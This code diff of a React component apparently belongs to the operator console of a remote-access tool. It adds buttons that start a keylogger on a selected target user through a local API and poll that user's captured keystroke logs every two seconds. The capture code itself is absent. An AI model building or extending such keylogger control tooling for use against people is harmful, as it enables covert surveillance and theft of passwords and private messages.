@@ -1,5 +1,5 @@
 import {User} from "@/Interfaces/User.ts";
-import { useState, useRef } from "react";
+import { useState, useRef, useEffect } from "react";
 import {Logs} from "@/Interfaces/Logs.ts";
 
 export function KeyloggerButtons(
@@ -21,14 +21,25 @@ export function KeyloggerButtons(
     const intervalRef = useRef<NodeJS.Timeout | null>(null); // To store interval ID
 
     const startKeylogger = async () => {
-        clearConsole();
 
+        try {
+            const response = await fetch("http://localhost:8000/api/modules/keylogger/start?id=" + selectedUser?.uuid, { method: "POST" });
+            const data = await response.json();
+            typeOutput("> " + data.message);
+            console.log(data.message);
+        } catch (error) {
+            console.error("Error starting keylogger:", error);
+        }
+
+    };
+
+    const showLogs = async () => {
         if (intervalRef.current) {
-            clearInterval(intervalRef.current); // Clear any existing interval before starting a new one
+            clearInterval(intervalRef.current);
         }
         await refreshKeyloggerData();
-        intervalRef.current = setInterval(refreshKeyloggerData, 2000); // 2000 milliseconds = 2 seconds
-    };
+        intervalRef.current = setInterval(refreshKeyloggerData, 2000);
+    }
 
     const refreshKeyloggerData = async () => {
         if (!selectedUser) return;
@@ -36,7 +47,9 @@ export function KeyloggerButtons(
         try {
             const response = await fetch("http://localhost:8000/api/modules/keylogger/logs?id=" + selectedUser?.uuid);
             const data: Logs = await response.json();
-            const logs = data.logs;
+            const { logs } = data;
+
+            if (!logs) return;
 
             setLastLogs(prevLogs => {
                 if (logs === prevLogs) {
@@ -44,13 +57,11 @@ export function KeyloggerButtons(
                 }
 
                 if (logs.startsWith(prevLogs) && logs !== prevLogs) {
+                    clearConsole();
                     setOutput(prev => [...prev, logs]);
-                    return logs; // Update with the new logs
                 }
 
-                clearConsole(); // Clear console if new logs are different
-                typeOutput(logs); // Output new logs
-                return logs; // Update state with the new logs
+                return logs;
             });
         } catch (error) {
             console.error("Error fetching logs:", error);
@@ -59,11 +70,19 @@ export function KeyloggerButtons(
 
     const stopKeylogger = () => {
         if (intervalRef.current) {
-            clearInterval(intervalRef.current); // Stop the interval
-            intervalRef.current = null; // Reset the reference
+            clearInterval(intervalRef.current);
+            intervalRef.current = null;
             console.log("Keylogger stopped.");
         }
     };
+
+    useEffect(() => {
+        return () => {
+            if (intervalRef.current) {
+                clearInterval(intervalRef.current);
+            }
+        };
+    }, []);
 
     return (
         <div className="mr-4 space-y-4 text-green-500 h-1/2">
@@ -73,10 +92,18 @@ export function KeyloggerButtons(
                 <p>Start keylogger</p>
             </button>
 
+
+            <button
+                onClick={() => showLogs()}
+                className=" border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
+                <p>Show logs</p>
+            </button>
+
+            
             <button
                 onClick={() => stopKeylogger()}
-                className="p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
-                <p>Stop keylogger</p>
+                className="mr-4 p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
+                <p>Stop logging</p>
             </button>
         </div>
     );
